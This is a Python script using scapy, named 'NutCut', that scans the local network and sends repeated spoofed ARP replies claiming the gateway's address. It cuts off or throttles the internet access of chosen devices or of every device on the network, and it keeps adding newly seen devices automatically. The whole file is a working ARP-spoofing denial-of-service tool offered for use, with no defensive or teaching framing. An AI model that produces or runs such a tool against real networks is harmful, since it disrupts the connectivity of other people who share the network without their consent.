from scapy.all import *
import threading
import time
import random

def get_mac(ip):
    resp, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=2, verbose=0)
    for _, r in resp:
        return r[Ether].src
    return None

def scan_network(my_ip):
    ip_parts = my_ip.split('.')
    network = '.'.join(ip_parts[:3]) + '.0/24'
    print(f"Scanning network {network} ...")
    arp = ARP(pdst=network)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    result = srp(packet, timeout=3, verbose=0)[0]

    devices = []
    for sent, received in result:
        devices.append(received.psrc)
    return devices

def nutcut(target_ip, gateway_ip, mode="cut", delay=1.0, drop_rate=0.0, stop_event=None):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"MAC for {target_ip} not found, skipping.")
        return
    pkt = Ether(dst=target_mac)/ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    
    print(f"[*] Starting {mode} mode on {target_ip} with delay {delay}s and drop_rate {drop_rate}")

    while not (stop_event and stop_event.is_set()):
        if mode == "cut":
            sendp(pkt, verbose=0)
        elif mode == "limit":
            if random.random() > drop_rate:
                sendp(pkt, verbose=0)
        time.sleep(delay)

def auto_scan_and_update_targets(gateway_ip, my_ip, mode, delay, drop_rate, initial_targets):
    threads = {}
    stop_events = {}

    # Start initial targets threads
    for ip in initial_targets:
        stop_event = threading.Event()
        t = threading.Thread(target=nutcut, args=(ip, gateway_ip, mode, delay, drop_rate, stop_event), daemon=True)
        t.start()
        threads[ip] = t
        stop_events[ip] = stop_event

    try:
        while True:
            devices = scan_network(my_ip)
            targets = [ip for ip in devices if ip != my_ip and ip != gateway_ip]

            # Update target_ips.txt
            with open("target_ips.txt", "w") as f:
                for ip in targets:
                    f.write(ip + "\n")

            # Stop threads for targets no longer present
            removed = set(threads.keys()) - set(targets)
            for ip in removed:
                print(f"[!] Stopping spoofing thread for {ip} (no longer in network)")
                stop_events[ip].set()
                threads[ip].join()
                del threads[ip]
                del stop_events[ip]

            # Start threads for new targets
            added = set(targets) - set(threads.keys())
            for ip in added:
                print(f"[+] Starting spoofing thread for new target {ip}")
                stop_event = threading.Event()
                t = threading.Thread(target=nutcut, args=(ip, gateway_ip, mode, delay, drop_rate, stop_event), daemon=True)
                t.start()
                threads[ip] = t
                stop_events[ip] = stop_event

            print(f"[=] Currently spoofing {len(threads)} targets. Next scan in 30 seconds.\n")
            time.sleep(60)
    except KeyboardInterrupt:
        print("\nStopping all spoofing threads...")
        for ev in stop_events.values():
            ev.set()
        for t in threads.values():
            t.join()
        print("All threads stopped. Exiting.")

def main():
    my_ip = conf.iface.ip
    gateway_ip = conf.route.route("0.0.0.0")[2]

    print(f"Your IP: {my_ip}")
    print(f"Gateway IP: {gateway_ip}\n")

    devices = scan_network(my_ip)
    targets = [ip for ip in devices if ip != my_ip and ip != gateway_ip]

    if not targets:
        print("No other devices found on the network.")
        return

    print("Devices found:")
    for i, ip in enumerate(targets, 1):
        print(f"{i}. {ip}")
    print("0. All devices")

    choice = input("\nSelect targets by number (e.g. 1,3) or 0 for all: ").strip()
    if choice == "0":
        selected = targets
    else:
        selected = []
        for c in choice.split(","):
            try:
                idx = int(c.strip()) - 1
                if 0 <= idx < len(targets):
                    selected.append(targets[idx])
            except:
                pass

    if not selected:
        print("No valid targets selected. Exiting.")
        return

    mode = input("Select mode: cut (putus total) / limit (ganggu connection): ").strip().lower()
    if mode not in ["cut", "limit"]:
        print("Invalid mode, defaulting to cut.")
        mode = "cut"

    delay = input("Set delay between packets in seconds (e.g. 1.0): ").strip()
    try:
        delay = float(delay)
    except:
        delay = 1.0

    drop_rate = 0.0
    if mode == "limit":
        drop_rate_input = input("Set drop rate (0.0 no drop, 0.5 = 50% packets drop): ").strip()
        try:
            drop_rate = float(drop_rate_input)
            if drop_rate < 0 or drop_rate > 1:
                drop_rate = 0.5
        except:
            drop_rate = 0.5

    print(f"\nStarting NutCut on {len(selected)} targets with auto-scan update. Press Ctrl+C to stop.\n")
    auto_scan_and_update_targets(gateway_ip, my_ip, mode, delay, drop_rate, selected)

if __name__ == "__main__":
    main()
